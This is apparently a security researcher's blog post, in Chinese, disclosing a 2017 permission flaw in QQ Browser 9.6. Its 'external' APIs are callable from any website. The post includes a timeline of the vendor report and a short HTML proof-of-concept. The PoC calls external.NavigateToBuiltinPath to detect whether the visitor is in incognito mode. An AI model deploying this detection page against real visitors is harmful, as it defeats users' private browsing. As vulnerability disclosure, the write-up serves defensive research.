---
layout: post
title: QQ Browser 9.6 API 权限控制问题导致泄露隐私模式
---

- 2017-05-12 17:31:17	用户“evi1m0”报告了该漏洞。
- 2017-05-12 17:36:15	管理员san@TSRC 跟进了该漏洞报告
- 2017-05-15 17:29:10	管理员Jim@TSRC 跟进了该漏洞报告
- 2017-05-17 10:40:22	管理员 Jim@TSRC 结束了该漏洞（暂未发现安全危害）

啥时候国内厂商审 Client 洞能没问题了，也就算真上道儿了。

#### external

多个 external API 在任意域都可执行，导致我们可以寻找较好利用的点进行漏洞攻击：

	external.NavigateToExtension = function (arg1) {
	    native
	    function DoNavigateToExtension();
	    return DoNavigateToExtension(arg1);
	};
	external.NavigateToExtensionPath = function (arg1, arg2) {
	    native
	    function DoNavigateToExtensionPath();
	    return DoNavigateToExtensionPath(arg1, arg2);
	};
	external.SendBannerMessage = function (arg1, arg2, arg3, arg4) {
	    native
	    function DoSendBannerMessage();
	    return DoSendBannerMessage(arg1, arg2, arg3, arg4);
	};
	external.NavigateToBuiltinPath = function (arg1, arg2) {
	    native
	    function NavigateToBuiltinPath();
	    return NavigateToBuiltinPath(arg1, arg2);
	};
	external.ShowActionBanner = function (arg1, arg2, arg3) {
	    native
	    function DoShowActionBanner();
	    return DoShowActionBanner(arg1, arg2, arg3);
	};

这里我们来分析 external.NavigateToBuiltinPath 通过测试可以发现第一个参数接收网址，第二个参数接收打开窗口模式，由于权限控制不严谨导致我们可以在任意域执行此 API ，例如：

- url, 2 // 当前页面打开 browser://url
- url, 4 // 新页面打开 browser://url
- ...

注意应用层本来是不能开启或控制特权域页面的，不过也正由于这个“特性”  (int)"qb::ExternalExtensionMessageFilter::OnNavigateToBuiltinPath" 的限制，我们只能存活跳转在 qqbrowser 域中：

![](https://ws1.sinaimg.cn/large/c334041bgy1ffob7duy1qj21060kswi1.jpg)

不过既然我们能够在任意域执行 API  ，跳转不出去也没有关系，利用之前的特性分析[ref: [https://www.n0tr00t.com/2017/01/19/Chromium-incognito-mode-track.html](https://www.n0tr00t.com/2017/01/19/Chromium-incognito-mode-track.html)] ，QQbrowser 使用 Chromium 内核自然通用，这次我们不需要特权域的跨站也可探测当前是否处于隐私模式中了。

> 这个点应该玩法还有很多，不过这里我仅限演示证明了之前研究的实用技巧性 xD

#### PoC

view-source:http://server.n0tr00t.com/qqbrowser/checkIncMode.html

	<html>
	  <head>
	    <meta charset="utf8">
	    <title>QQ Brwoser 9.6 incognito mode track - @evi1m0</title>
	  </head>
	  <body>
	    <script>
	      if (navigator.userAgent.indexOf('QQBrowser') !== -1) {} else {
	         document.body.innerHTML = 'Pls use QQBrowser :(';
	      }
	
	      // Ref: https://www.n0tr00t.com/2017/01/19/Chromium-incognito-mode-track.html
	      external.NavigateToBuiltinPath("/settings", 2);
	      setTimeout('alert("Catch you!")', 2000);
	    </script>
	  </body>
	</html>

![](https://ws1.sinaimg.cn/large/c334041bgy1ffobac6mayj21oc18kn4n.jpg)